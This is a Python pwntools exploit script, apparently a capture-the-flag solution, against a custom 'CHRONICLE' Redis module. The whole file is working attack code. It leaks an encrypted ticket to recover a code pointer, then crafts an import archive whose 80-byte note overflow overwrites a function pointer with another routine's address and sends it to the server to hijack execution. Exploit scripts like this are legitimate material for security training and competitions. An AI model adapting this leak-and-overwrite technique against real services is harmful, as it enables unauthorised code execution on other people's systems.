#!/usr/bin/env python3
from pwn import *
import time

context.log_level = "info"

DEFAULT_HOST = "chal.thjcc.org"
DEFAULT_PORT = 6379

CONST = 0x9e3779b97f4a7c15
MASK = (1 << 64) - 1

# Remote Docker build (Redis 7.2.15-bookworm/GCC 12):
# commit_annotation = base + 0x11b0
# materialize_anchor = base + 0x1280
# Ticket untuk task NOTE mengenkripsi alamat commit_annotation.
COMP_OFF = 0x11B0
MAT_OFF  = 0x1280


def conn():
    host = args.HOST if args.HOST else (DEFAULT_HOST if args.REMOTE else "127.0.0.1")
    port = int(args.PORT) if args.PORT else DEFAULT_PORT
    return remote(host, port)


def redis_cmd(command):
    r = conn()
    r.sendline(command)
    data = r.recvall(timeout=2)
    r.close()
    return data


def new_task():
    r = conn()

    r.sendline(
        b"CHRONICLE.NEW 60000 exploit x"
    )

    line = r.recvline().strip()

    r.close()

    # Redis RESP integer:
    # :4105
    task_id = int(line.lstrip(b":"))

    return task_id


def show_task(task_id):

    r = conn()

    r.sendline(
        f"CHRONICLE.SHOW {task_id}".encode()
    )

    data = r.recvall(timeout=2)

    r.close()

    text = data.decode(errors="ignore")

    log.debug(text)

    lines = text.splitlines()

    # RESP array:
    #
    # *6
    # :id
    # +state
    # $label
    # :ticket
    # :delay
    # $result
    #

    ticket = None

    for i, line in enumerate(lines):

        # ticket adalah integer ke-4
        # setelah:
        # *6
        # :id
        # +state
        # $label
        # <label>
        # :ticket

        if line.startswith(":"):

            if i >= 1:
                # cari integer kedua setelah id
                previous = [
                    x for x in lines[:i]
                    if x.startswith(":")
                ]

                if len(previous) == 1:
                    ticket = int(line[1:])
                    break


    if ticket is None:
        print(text)
        raise Exception(
            "ticket leak gagal"
        )

    return ticket

def recover_completion(task_id, ticket):

    ticket &= MASK

    salt = (
        task_id * CONST
    ) & MASK

    salt = (
        (salt << 17)
        |
        (salt >> (64 - 17))
    ) & MASK

    completion = ticket ^ salt

    return completion


def uvarint(value):

    out = b""

    while True:

        byte = value & 0x7f

        value >>= 7

        if value:
            out += bytes(
                [byte | 0x80]
            )
        else:
            out += bytes([byte])
            break

    return out


def fnv1a32(data):

    h = 0x811c9dc5

    for b in data:

        h ^= b

        h = (
            h * 0x01000193
        ) & 0xffffffff

    return h


def build_archive(target):

    label = b"x"


    # overflow:
    #
    # note[80]
    # completion pointer
    #

    body = (
        b"A" * 80
        +
        p64(target)
        +
        b"B" * (256 - 88)
    )


    archive = b""

    # magic
    archive += b"CHRN"

# version
    archive += b"\x01"

# kind NOTE
    archive += b"\x01"

# reserved bytes
    archive += b"\x00\x00"

# delay
    archive += p32(10)

    # label length
    archive += bytes(
        [len(label)]
    )

    archive += label


    # body length varint
    archive += uvarint(
        len(body)
    )

    archive += body


    checksum = fnv1a32(
        archive
    )

    archive += p32(
        checksum
    )

    return archive



def import_archive(archive):

    r = conn()

    cmd = b"CHRONICLE.IMPORT"

    resp = (
        b"*2\r\n"
        + b"$" + str(len(cmd)).encode() + b"\r\n"
        + cmd + b"\r\n"
        + b"$" + str(len(archive)).encode() + b"\r\n"
        + archive + b"\r\n"
    )

    r.send(resp)

    data = r.recvall(timeout=3)

    r.close()

    return data


def main():

    log.info(
        "creating leak task"
    )

    task = new_task()

    log.success(
        f"task id = {task}"
    )


    ticket = show_task(task)

    log.success(
        f"ticket = {ticket:#x}"
    )


    completion = recover_completion(
        task,
        ticket
    )

    log.success(
        f"completion = {completion:#x}"
    )


    target = (
        completion
        +
        (MAT_OFF - COMP_OFF)
    )


    log.success(
        f"materialize = {target:#x}"
    )


    archive = build_archive(
        target
    )

    log.info(
        f"archive size = {len(archive)}"
    )


    result = import_archive(
        archive
    )

    print(
        result
    )


    # RESP integer hasil import
    try:

        new_id = int(
            result.strip()
            .lstrip(b":")
        )

    except:

        raise Exception(
            "IMPORT gagal"
        )


    log.success(
        f"new task = {new_id}"
    )


    log.info(
        "waiting timer..."
    )

    time.sleep(
        1
    )


    for i in range(5):

        time.sleep(1)

        out = redis_cmd(
            f"CHRONICLE.SHOW {new_id}".encode()
        )

        print(
            out.decode(
                errors="ignore"
            )
        )


if __name__ == "__main__":
    main()
